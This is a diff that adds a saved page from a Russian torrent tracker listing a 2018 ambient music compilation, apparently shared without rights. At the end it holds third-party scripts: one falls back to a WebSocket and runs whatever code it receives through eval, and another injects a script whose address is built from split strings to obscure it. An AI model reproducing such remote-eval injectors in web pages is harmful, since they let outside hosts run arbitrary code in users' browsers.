@@ -1,0 +1,448 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: VA - Eye In The Sky: Music For Dreams (2018) MP3</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>VA - Eye In The Sky: Music For Dreams (2018) MP3</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:10717d6e07240796265fca9bcf0fd8303cfd91a6&amp;dn=rutor.info_VA+-+Eye+In+The+Sky%3A+Music+For+Dreams+%282018%29+MP3&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=630494"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/630494"><img src="http://s.rutor.info/t/down.png"> Скачать Eye_In_The_Sky_Music_For_Dreams_2018.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="https://d.radikal.ru/d21/1805/61/ce6bec70fc57.png" /><br />
+<br />
+<b>Название: </b>Eye In The Sky: Music For Dreams<br />
+<b>Исполнитель: </b>VA<br />
+<b>Год: </b>2018<br />
+<b>Жанр: </b> <a href="/tag/2/Ambient" target="_blank">Ambient</a>, <a href="/tag/2/Downtempo" target="_blank">Downtempo</a>, <a href="/tag/2/Chillout" target="_blank">Chillout</a><br />
+<br />
+<b>Продолжительность: </b>08:32:25<br />
+<b>Формат/Кодек: </b>MP3<br />
+<b>Битрейт аудио: </b>320 kpbs<br />
+<br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Трек-лист</div><div class="hidebody"></div><textarea class="hidearea"><br />
+001.  York &amp; Anthya  -  The Horizon Of Mars (Original Mix)  5:41<br />
+002.  The Echelon Effect  -  Goodbye Sierra  2:41<br />
+003.  DJ Dag &amp; Matthew Kramer feat. Linda Rocco  -  Running Up That Hill (Radio Mix)  3:33<br />
+004.  Sunyata Project  -  Mystic Adventures (Oriental Chill Mix)  3:12<br />
+005.  351 Lake Shore Drive  -  Moon Shadow (Original Mix)  5:24<br />
+006.  Eguana  -  Deep Numb  7:07<br />
+007.  Anthya  -  Slowly (Original Mix)  5:55<br />
+008.  Mahoroba  -  Warm Memories (Sunny Day Mix)  4:40<br />
+009.  Greg Walker  -  Rio Geo (Original Mix)  3:38<br />
+010.  Musicformessier feat. Dan Caine  -  Millennium  3:34<br />
+011.  Weathertunes  -  Coincidence (Original Mix)  3:43<br />
+012.  Jens Buchert  -  Hollows  4:22<br />
+013.  Inventors Of The Sun  -  Sundance (Original Mix)  5:31<br />
+014.  Gordon Geco  -  Eye In The Sky (Original Mix)  4:40<br />
+015.  Michael E  -  Be Kind (Original Mix)  6:30<br />
+016.  Emotional  -  Love Is In The Air (Cool Down Mix)  5:33<br />
+017.  Marc Hartman  -  Silhouettes (Original Mix)  3:56<br />
+018.  Aether feat. Tsubame  -  Remnant  2:57<br />
+019.  Marga Sol  -  Since You Are Gone (Original Mix)  4:41<br />
+020.  Alpha Prime  -  Outpost (Original Mix)  4:53<br />
+021.  Roberto Bronco  -  High Sands (Original Mix)  5:29<br />
+022.  Fourth Dimension  -  Ionization  7:36<br />
+023.  Greg Walker  -  Mosaic (Original Mix)  4:08<br />
+024.  Pascal Dubois  -  City Games (Lovely Area Mix)  4:06<br />
+025.  Placid Larry  -  Mend (Original Mix)  4:31<br />
+026.  Aether  -  Floresence  2:49<br />
+027.  Greg Walker  -  In Night&#039;s Embers (Original Mix)  3:47<br />
+028.  Sami Sivananda  -  Wisdom (Original Mix)  3:34<br />
+029.  Peter Pearson  -  In The Clouds (Original Mix)  5:10<br />
+030.  AndAWan feat. Irene Makri  -  Time To Remember  4:24<br />
+031.  Stargazer  -  Straight From The Soul (Original Mix)  4:18<br />
+032.  Sverre Knut Johansen  -  Apocalypse (Epic)  6:44<br />
+033.  Greg Walker  -  Then Again (Original Mix)  4:24<br />
+034.  Rukirek  -  Walking On Glass (Original Mix)  12:05<br />
+035.  351 Lake Shore Drive  -  Sunrise (Original Mix)  5:36<br />
+036.  Delerium  -  Stay  4:09<br />
+037.  Koan  -  Through The Looking Glass  8:07<br />
+038.  Sean Hayman feat. Anong  -  Mysterious Ayutthaya (Buddha Deluxe Mix)  5:12<br />
+039.  Mirko Firzlaff  -  Image (Original Mix)  3:00<br />
+040.  Physical Dreams  -  Nature Sounds N5 (Original Mix)  12:00<br />
+041.  Groove Gauchos  -  Shirona (The Drugstore Mix)  5:22<br />
+042.  Remundo  -  Soupire (Original Mix)  4:26<br />
+043.  Cinematic  -  Flyway (Summer Of Love Mix)  6:29<br />
+044.  Maksim Biserov  -  Rumination (Original Mix)  6:27<br />
+045.  DJ Maretimo feat. Cafe Americaine  -  Azur Blue (Jazzy James Junior Cut)  5:42<br />
+046.  Placid Larry  -  Whirl (Original Mix)  3:21<br />
+047.  ForstWolfin  -  Silence 2  6:56<br />
+048.  Island Sun  -  Aurora (Red Light Cut)  5:41<br />
+049.  Entheogenic  -  A Language Older Than Words  9:22<br />
+050.  Frank Borell  -  Just For One Day (The Magic Field Cut)  4:44<br />
+051.  E-Motive  -  Before The Flood (Original Mix)  7:49<br />
+052.  Erugo Purakushi  -  World Without Words  10:31<br />
+053.  Vladi Strecker  -  Birds Over The Sea (Endless Ocean Mix)  6:55<br />
+054.  Wilton De Grey  -  The Morning After 1 (Original Mix)  2:59<br />
+055.  Pascal Dubois  -  Slo Mo (NYC Cut)  4:23<br />
+056.  James Butler  -  Blue Sky (Original Mix)  2:59<br />
+057.  Evolving Atmospheres  -  New Stars (432 Hz Version)  1:11<br />
+058.  Citrus Jam  -  Soft Rock Cafe (Electric Hands Mix)  4:10<br />
+059.  The Future Sound Of London  -  Next Town  1:35<br />
+060.  Sami Sivananda  -  Inner Peace (Original Mix)  4:25<br />
+061.  Le Voyage  -  Flow Motion (The Flowerbed Mix)  5:56<br />
+062.  Lifeserzh  -  Just For You (Deep Mix)  5:55<br />
+063.  Adriatic Grooves  -  Under The Radar (Dragonflight Cut)  5:01<br />
+064.  Ocean Mind  -  House Of Mood (Original Mix)  3:52<br />
+065.  Emotional  -  Soul Craft (Deep Chill Mix)  5:17<br />
+066.  Gordon Geco  -  Trinity (Original Mix)  3:33<br />
+067.  Vladi Strecker  -  My Old Vinyl (Happy Day Mix)  6:46<br />
+068.  Rinat KaaS  -  Children Of The Metropolis (Original Mix)  3:59<br />
+069.  Cocogroove  -  Taxi Soul (Jazzy James Easy Listening Cut)  4:48<br />
+070.  UCP Berlin  -  Arrival In Sechet-Hetep (Original Mix)  8:14<br />
+071.  Mahoroba  -  Eurasia (Tour De Chill Mix)  5:27<br />
+072.  Svendaq  -  Harmonies And Prayers (Original Mix)  4:12<br />
+073.  Le Voyage  -  Late Night (Step By Step Cut)  5:14<br />
+074.  Mirko Firzlaff  -  Nostalgia (Original Mix)  6:15<br />
+075.  Citrus Jam  -  Cappuccino (3 PM Cut)  3:44<br />
+076.  Sami Sivananda  -  Reflections (Original Mix)  4:28<br />
+077.  Sean Hayman  -  The Night Of The Sultans (Le Voyage Ethno Mix)  5:34<br />
+078.  Gordon Geco  -  Frequencys (Original Mix)  5:05<br />
+079.  Pascal Dubois  -  Grounge Lounge (Spring Lounge Mix)  4:52<br />
+080.  Dormidontov  -  Sinema Space (Original Mix)  5:28<br />
+081.  The Man Behind C.  -  In The Key Of Blue (Slowgroove Mix)  4:43<br />
+082.  Ocean Mind  -  Mission To Mars (Original Mix)  2:40<br />
+083.  Frank Borell  -  A New Beginning (Jazz Mix)  4:59<br />
+084.  UCP Berlin  -  Breakpoint Of The Gods (Original Mix)  8:13<br />
+085.  Vladi Strecker  -  Dwelling In The Sky (Air Castle Mix)  5:46<br />
+086.  Rinat KaaS  -  Insouciance (Original Mix)  3:30<br />
+087.  Citrus Jam  -  Just Sweet (Moogy Live Mix)  4:51<br />
+088.  Svendaq  -  Jungle Stalker (Original Mix)  4:50<br />
+089.  Mahoroba  -  Heavens Flow (Secrets Air Cut)  5:16<br />
+090.  Rex Kramer  -  In The Kitchen (Original Mix)  4:51<br />
+091.  Kid Coconutz  -  Punch Lines (Nano Mix)  6:14<br />
+092.  Konrad Blank  -  Loneliness (Original Mix)  4:44<br />
+093.  Citrus Jam  -  Sea Fair (Over The Seas Mix)  4:15<br />
+094.  Mojito Sunrise  -  Mojito Sunrise (Original Mix)  4:15<br />
+095.  Sean Hayman  -  Summer Light (Laid Back Memories Cut)  5:47<br />
+096.  Sunyata Project  -  Mahareena (Ibiza Mix)  5:07<br />
+097.  Mirko Firzlaff  -  India (Original Mix)  4:10<br />
+098.  Placid Larry  -  Spacescape (Original Mix)  2:19<br />
+099.  UCP Berlin  -  Beyond The Caves (Original Mix)  9:19<br />
+100.  Vincent Vegas  -  Via Del Sol (Canyamel Radio Cut)  3:44<br />
+</textarea></div><br />
+<br />
+<b>Дополнительная информация: </b>Загадочная и романтичная атмосферно-релаксовая компиляция для прогулок на свежем воздухе по городскому парку или дремучему лесу. Погружение в такую музыку имеет первостепенную важность для размышлений и поиска своего я. Данная подборка оказывает положительное влияние на психику и эмоциональное состояние человека.</td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/1441382/0" target="_blank">electro75</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>10 из 10 (1 голосов, самая низкая оценка - 10, самая высокая - 10)</td></tr>
+<tr><td class="header">Категория</td><td><a href="/audio" target="_blank">Музыка</a></td></tr>
+<tr><td class="header">Раздают</td><td>53</td></tr>
+<tr><td class="header">Качают</td><td>24</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 8:19:06 (17 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 18:40:41  (14 часа назад)</td></tr>
+<tr><td class="header">Размер</td><td>1.21&nbsp;GB  (1304438291 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 630494);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630552"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:d26947eb1a65d48f35b0637705f064114ed4b9d5&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630552/va-funky-disco-house-grooves-vol.10-2018-mp3">VA - Funky Disco House Grooves Vol.10 (2018) MP3 </a></td> 
+<td align="right">344.17&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;24</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;6</span></td></tr><tr class="tum"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630515"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:4bc8c481af5df7d938f09acd36a7e32082dd370f&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630515/va-dance-club-2018.02-2018-mp3">VA - Dance Club 2018.02 (2018) MP3 </a></td> 
+<td align="right">271.84&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;37</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;7</span></td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/630506"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:a4c776fb527106647be96c36071b6630c55e9725&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630506/va-bravo-hits-90s-2cd-2018-mp3">VA - Bravo Hits 90&#039;s [2CD] (2018) MP3 </a></td> <td align="right">4<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">364.80&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;46</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;8</span></td></tr><tr class="tum"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630480"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:80e6ab57e75748901b46a264480b198b6cb9a21d&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630480/va-80s-metal-gold-2cd-2007-flac">VA - 80&#039;s Metal Gold [2CD] (2007) FLAC </a></td> 
+<td align="right">1.00&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;30</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;10</span></td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630475"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:56669a964cdc55516de98295c370ae3b81ac3d51&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630475/va-eurovision-song-contest-lisbon-2018-flac">VA - Eurovision Song Contest Lisbon (2018) FLAC </a></td> 
+<td align="right">889.57&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;22</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;13</span></td></tr><tr class="tum"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630459"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:763b4ea75a7a95368d985bfeff6534ff54ec0256&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630459/va-nrj-urban-latino-hits-only-2cd-2018-mp3">VA - NRJ Urban Latino Hits Only [2CD] (2018) MP3 </a></td> 
+<td align="right">307.46&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;11</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630438"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:a7e92fa5e6c027da04b3ba792872ba14c593a9f3&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630438/va-noventeros-mix-blanco-y-negro-2018-mp3">VA - Noventeros Mix: Blanco Y Negro (2018) MP3 </a></td> 
+<td align="right">333.14&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;6</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/2/0/0/VA" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/630494.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (100)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=630494">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(630494);">Промодерировать раздачу</span> | <span onclick="confirm_delete(630494);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/630494">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>Radjah</b></td> <td>08-05-2018 19:07:24 (13 часа назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3199477"></span><script type="text/javascript">cOptions(1161898,3199477);</script></td></tr><tr><td class="c_t" colspan=4>Благодарю!</td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
